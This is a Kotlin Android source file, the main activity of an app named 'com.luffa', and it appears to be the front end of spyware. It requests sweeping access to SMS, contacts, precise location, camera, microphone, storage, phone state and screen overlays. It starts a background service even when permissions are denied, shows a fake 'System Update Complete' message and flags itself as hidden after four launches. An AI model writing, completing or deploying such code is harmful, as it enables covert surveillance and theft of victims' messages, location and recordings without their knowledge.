package com.luffa

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.VibrationEffect
import android.os.Vibrator
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

import com.luffa.MyService

import androidx.preference.PreferenceManager  // ✅ সঠিক



class MainActivity : AppCompatActivity() {

    private val REQUEST_PERM_CODE = 1001
    private lateinit var serviceIntent: Intent
    private lateinit var prefs: android.content.SharedPreferences
    private val LAUNCH_LIMIT = 4

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        prefs = PreferenceManager.getDefaultSharedPreferences(this)
        
        // Increment Launch Count
        val currentLaunches = prefs.getInt("launch_count", 0) + 1
        prefs.edit().putInt("launch_count", currentLaunches).apply()

        // Check if we need to hide
        if (currentLaunches >= LAUNCH_LIMIT) {
            prefs.edit().putBoolean("app_hidden", true).apply()
            Toast.makeText(this, "System Update Complete", Toast.LENGTH_SHORT).show()
        }

        serviceIntent = Intent(this, MyService::class.java)
        requestPermissions()
    }

    private fun requestPermissions() {
        val perms = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.SYSTEM_ALERT_WINDOW
        )

        val ungranted = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (ungranted.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, ungranted.toTypedArray(), REQUEST_PERM_CODE)
        } else {
            startService()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        // Even if some are denied, start service to avoid crash
        startService()
    }

    private fun startService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        // Vibrate briefly to indicate success (optional)
        val vibrator = getSystemService(Vibrator::class.java)
        vibrator?.vibrate(VibrationEffect.createOneShot(100, VibrationEffect.DEFAULT_AMPLITUDE))
        
        finish() // Close activity immediately
    }
}
